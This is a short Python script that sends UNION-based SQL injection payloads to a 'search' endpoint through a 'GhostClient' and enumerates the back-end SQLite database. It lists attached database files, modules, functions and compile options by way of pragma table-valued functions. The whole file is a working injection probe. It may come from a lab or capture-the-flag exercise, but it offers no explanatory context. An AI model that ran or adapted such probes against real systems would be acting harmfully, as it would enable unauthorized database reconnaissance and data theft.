from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

def test_q(q_str, name=""):
    try:
        res = c.request("search", {"q": f"' UNION SELECT 1, {q_str}--"})
        print(f"=== {name} ({q_str}) ===")
        if res.get("ok"):
            for r in res["data"]["rows"]:
                if r["id"] == 1:
                    print(" ", r)
        else:
            print("  ERROR:", res.get("error"))
    except Exception as e:
        print("  EXC:", e)

test_q("name, file FROM pragma_database_list()", "database_list")
test_q("name, NULL FROM pragma_module_list()", "module_list")
test_q("name, NULL FROM pragma_function_list()", "function_list")
test_q("compile_options, NULL FROM pragma_compile_options()", "compile_options")
